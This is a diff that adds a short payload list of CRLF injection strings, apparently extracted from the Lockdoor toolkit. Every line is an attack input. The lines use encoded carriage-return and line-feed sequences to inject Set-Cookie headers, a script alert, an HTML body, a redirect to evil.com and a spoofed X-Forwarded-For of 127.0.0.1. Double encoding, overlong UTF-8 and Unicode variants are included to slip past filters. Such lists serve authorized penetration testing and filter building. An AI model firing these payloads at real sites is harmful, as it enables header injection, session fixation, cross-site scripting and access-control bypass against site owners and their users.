@@ -1,0 +1,14 @@
+# CRLF Injection Bypass Payloads — Lockdoor extraction
+%0d%0aSet-Cookie:crlf=injection
+%0d%0aX-Injected:CyberDyne
+%0D%0ASet-Cookie:crlf=injection
+%0d%0a%0d%0a<script>alert(1)</script>
+%250d%250aSet-Cookie:crlf=injection
+%25250d%25250aSet-Cookie:crlf=injection
+%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>CyberDyne</h1>
+%0d%0aLocation:https://evil.com
+%E5%98%8A%E5%98%8DSet-Cookie:crlf=injection
+%c0%8d%c0%8aSet-Cookie:crlf=injection
+\r\nSet-Cookie:crlf=injection
+%5cr%5cnSet-Cookie:crlf=injection
+%0d%0aX-Forwarded-For:127.0.0.1
